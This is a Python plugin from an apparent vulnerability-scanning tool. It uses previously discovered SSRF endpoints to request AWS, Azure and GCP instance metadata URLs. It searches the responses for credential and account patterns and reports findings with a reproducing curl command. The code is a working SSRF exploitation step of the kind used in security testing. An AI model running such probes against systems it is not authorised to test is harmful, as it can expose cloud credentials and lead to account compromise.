# vibee_hacker/plugins/blackbox/cloud_metadata.py
"""Cloud metadata access via SSRF exploitation plugin."""

from __future__ import annotations

import re
import shlex

import httpx

from vibee_hacker.core.models import Target, Result, Severity, InterPhaseContext
from vibee_hacker.core.plugin_base import PluginBase

# Cloud metadata service URLs to probe via SSRF
METADATA_URLS = [
    "http://169.254.169.254/latest/meta-data/",       # AWS IMDSv1
    "http://169.254.169.254/metadata/instance",        # Azure IMDS
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
]

# Patterns in metadata responses
METADATA_PATTERNS = [
    re.compile(r"ami-id|ami-launch-index|instance-id|security-credentials", re.I),
    re.compile(r"subscriptionId|resourceGroupName|vmId", re.I),
    re.compile(r"computeMetadata|project-id|serviceAccounts", re.I),
    re.compile(r"169\.254\.169\.254", re.I),
    re.compile(r"iam/security-credentials", re.I),
]


class CloudMetadataPlugin(PluginBase):
    name = "cloud_metadata"
    description = "Exploit SSRF endpoints to access cloud instance metadata services"
    category = "blackbox"
    phase = 3
    base_severity = Severity.CRITICAL
    detection_criteria = "SSRF endpoint fetches cloud metadata URL and returns cloud metadata patterns"
    expected_evidence = "AWS/GCP/Azure metadata patterns in SSRF-proxied response"

    async def run(self, target: Target, context: InterPhaseContext | None = None) -> list[Result]:
        if context is None or not context.ssrf_endpoints:
            return []

        results: list[Result] = []

        async with httpx.AsyncClient(verify=target.verify_ssl, timeout=10) as client:
            for ssrf_endpoint in context.ssrf_endpoints:
                for metadata_url in METADATA_URLS:
                    # Build the full SSRF probe URL
                    if "?" in ssrf_endpoint or ssrf_endpoint.endswith("="):
                        probe_url = ssrf_endpoint + metadata_url
                    else:
                        probe_url = ssrf_endpoint + "?url=" + metadata_url

                    try:
                        resp = await client.get(probe_url)
                    except (httpx.TransportError, httpx.InvalidURL, httpx.DecodingError):
                        continue

                    if resp.status_code not in (200, 206):
                        continue

                    body = resp.text[:500_000]
                    for pattern in METADATA_PATTERNS:
                        if pattern.search(body):
                            cloud = "Unknown cloud"
                            if "169.254.169.254/latest" in metadata_url:
                                cloud = "AWS"
                            elif "169.254.169.254/metadata" in metadata_url:
                                cloud = "Azure"
                            elif "google.internal" in metadata_url:
                                cloud = "GCP"

                            results.append(Result(
                                plugin_name=self.name,
                                base_severity=self.base_severity,
                                title=f"Cloud metadata accessible via SSRF ({cloud})",
                                description=(
                                    f"The SSRF endpoint {ssrf_endpoint} was used to access the "
                                    f"{cloud} cloud metadata service at {metadata_url}. "
                                    f"This exposes instance credentials, IAM roles, and cloud "
                                    f"configuration data, potentially leading to full cloud account "
                                    f"compromise."
                                ),
                                evidence=(
                                    f"SSRF endpoint: {ssrf_endpoint} | "
                                    f"Metadata URL: {metadata_url} | "
                                    f"Cloud: {cloud} | "
                                    f"Pattern: {pattern.pattern} | "
                                    f"Response snippet: {body[:200]}"
                                ),
                                cwe_id="CWE-918",
                                endpoint=probe_url,
                                curl_command=f"curl -v {shlex.quote(probe_url)}",
                                rule_id="cloud_metadata_via_ssrf",
                            ))
                            return results  # Critical finding, stop immediately

        return results
